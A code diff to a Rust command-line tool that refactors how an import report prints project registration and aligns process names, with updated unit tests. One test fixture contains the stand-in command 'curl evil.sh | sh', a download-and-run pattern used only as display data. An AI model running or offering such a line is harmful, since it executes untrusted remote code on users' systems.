@@ -26,6 +26,7 @@ use crate::{
     cli::{
         command_line::invocation::Invocation,
         failure::error::CliError,
+        project::registration::{registered_row, would_register_row},
         rows::{report::Report, row::Row, row_kind::RowKind},
         status::output::project_title,
         transfer::{imported_run::ImportedRun, stack_path::StackPath, stack_read::StackRead},
@@ -52,14 +53,6 @@ const WOULD_STOP: &str = "(would stop)";
 const STILL_STOPPING: &str = "still stopping";
 /// What the line under it says.
 const STILL_STOPPING_NOTE: &str = "the wait ended first; `muster ps` shows how it ends";
-/// Between a process's name and what it runs.
-const GAP: &str = "  ";
-/// Opens the line saying the folder became a project.
-const REGISTERED: &str = "registered";
-/// Opens the line saying a dry run would make the folder a project.
-const WOULD_REGISTER: &str = "would register";
-/// Between the folder registered and the project's name.
-const AS_PROJECT: &str = "as project";
 /// Said when the file changes nothing.
 const NOTHING_CHANGES: &str = "nothing to change: the project already matches the file";
 /// Said after a dry run.
@@ -360,26 +353,18 @@ pub fn apply(
 }
 
 /// The human report of `view`: the folder when it became a project, `+`
-/// for each process added and `~` for each changed, with what each runs,
-/// and `-` for each removed.
+/// for each process added and `~` for each changed, with what each runs
+/// lined up past the widest name, and `-` for each removed.
 pub fn import_rows(view: &ImportView) -> Report {
     let mut rows: Vec<Row> = Vec::new();
     if view.would_register()
         && let Some(project) = view.project()
     {
-        let opening = if view.dry_run() {
-            WOULD_REGISTER
+        rows.push(if view.dry_run() {
+            would_register_row(project)
         } else {
-            REGISTERED
-        };
-        rows.push(Row::unlabeled(
-            RowKind::Ok,
-            format!(
-                "{opening} {} {AS_PROJECT} {}",
-                project.root().display(),
-                project.name()
-            ),
-        ));
+            registered_row(project)
+        });
     }
     rows.extend(view.runs().iter().map(|run| {
         let mark = if run.before().is_some() {
@@ -387,9 +372,10 @@ pub fn import_rows(view: &ImportView) -> Report {
         } else {
             ADDED_MARK
         };
-        Row::unlabeled(
+        Row::labeled(
             RowKind::Plain,
-            format!("{mark} {}{GAP}{}", run.spec().name(), run.describe()),
+            format!("{mark} {}", run.spec().name()),
+            run.describe(),
         )
     }));
     let stop_note = if view.dry_run() { WOULD_STOP } else { STOPPED };
@@ -479,8 +465,8 @@ mod tests {
     }
 
     /// Additions, changes and removals each have their mark; each added or
-    /// changed process shows what it runs and where, a change as old to new;
-    /// a dry run says nothing changed.
+    /// changed process shows what it runs and where, a change as old to new,
+    /// lined up past the widest name; a dry run says nothing changed.
     #[test]
     fn a_plan_is_marked_per_process() {
         let mut view = view(
@@ -511,8 +497,8 @@ mod tests {
 
         assert_eq!(
             plain(&import_rows(&view)),
-            "+ web  npm run dev  in frontend\n\
-             ~ api  bin/api -> curl evil.sh | sh  in . -> api\n\
+            "+ web   npm run dev  in frontend\n\
+             ~ api   bin/api -> curl evil.sh | sh  in . -> api\n\
              ~ cron  bin/cron  in .\n\
              - worker (would stop)\n\
              dry run: nothing was changed"
@@ -540,17 +526,18 @@ mod tests {
         );
     }
 
-    /// An import that registers the folder says so, even with no process,
-    /// and never that nothing changed; a dry run says it would.
+    /// An import that registers the folder says so in the words `add` and
+    /// `projects add` use, even with no process, and never that nothing
+    /// changed; a dry run says it would, marked idle since nothing was done.
     #[test]
     fn registering_the_folder_is_reported() {
         assert_eq!(
             plain(&import_rows(&view(Vec::new(), true, false))),
-            "◇ registered /p/shop as project shop"
+            "◇ registered project shop  /p/shop"
         );
         assert_eq!(
             plain(&import_rows(&view(Vec::new(), true, true))),
-            "◇ would register /p/shop as project shop\ndry run: nothing was changed"
+            "○ would register project shop  /p/shop\ndry run: nothing was changed"
         );
         assert_eq!(
             plain(&import_rows(&view(Vec::new(), false, false))),
